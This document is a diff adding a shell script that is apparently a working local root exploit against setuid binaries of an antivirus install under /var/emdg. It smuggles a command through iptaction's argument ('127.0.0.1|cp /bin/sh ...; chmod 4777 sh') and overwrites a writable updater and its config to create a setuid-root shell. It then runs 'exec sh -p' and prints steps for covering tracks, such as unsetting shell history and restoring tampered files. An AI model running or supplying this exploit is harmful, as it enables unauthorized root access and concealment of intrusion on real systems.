@@ -1,0 +1,82 @@
+#!/bin/sh
+
+if [[ $# = 0 ]]; then
+  DIR=/var/emdg
+else
+  DIR=$1
+fi
+
+PATH=.:$PATH
+export PATH
+
+if [[ `id -ru` == 0 ]]; then
+  id
+  exit
+fi
+
+EXE=$DIR/sbin/iptaction
+OWNER=`ls -la $EXE|awk '{print $3}'`
+
+if [ -r $EXE ] && [ -u $EXE ] && [ $OWNER = "root" ] ; then
+  $EXE "127.0.0.1|cp /bin/sh .;chown root sh; chmod 4777 sh;" perm
+  echo unset HISTFILE HISTFILESIZE HISTSIZE
+  echo rm sh $0
+  echo ls -la
+  echo 
+  exec sh -p
+else
+  echo skipping $EXE
+  echo wrong permissions
+  ls -la $EXE
+  echo
+fi
+
+EXE=$DIR/sbin/ey_vrupdate
+OWNER=`ls -la $EXE|awk '{print $3}'`
+
+echo trying $EXE
+echo
+
+KEEPUP=$DIR/sbin/keepup2date
+OWNER2=`ls -la $KEEPUP|awk '{print $3}'`
+CONF=`strings -a $EXE|grep kav.*conf$`
+OWNER3=`ls -la $CONF|awk '{print $3}'`
+echo configuration file: 
+ls -l $CONF
+echo
+
+if [ -r $EXE ] && [ -u $EXE ] && [ $OWNER = "root" ] ; then
+  echo ls -li $KEEPUP $CONF
+  ls -li $KEEPUP $CONF
+  echo ls -lic $KEEPUP $CONF 
+  ls -lic $KEEPUP $CONF 
+  echo ls -liu $KEEPUP $CONF
+  ls -liu $KEEPUP $CONF
+  
+  if [ -w $KEEPUP ] && [ $OWNER2 = "nobody" ] && [ -w $CONF ] && [ $OWNER3 = "nobody" ]; then
+    tar cvfp .t.$$ $KEEPUP $CONF
+    cat /bin/sh > $KEEPUP
+    echo "cp /bin/sh .;chown root sh; chmod 4777 sh" > $CONF
+    chmod +x $CONF
+    echo
+    echo clean up when elevated:
+    echo unset HISTFILE HISTFILESIZE HISTSIZE
+    echo "(cd /; tar xvfp `pwd`/.t.$$)"
+    echo "ls -la $KEEPUP $CONF"
+    echo rm .t.$$ sh $0
+    echo ls -la
+    echo
+    $EXE
+    exec sh -p
+  else
+    echo
+    echo skipping $KEEPUP $CONF
+    echo wrong permissions
+    ls -la $KEEPUP $CONF
+  fi
+else
+  echo
+  echo skipping $EXE
+  echo wrong permissions
+  ls -la $EXE
+fi
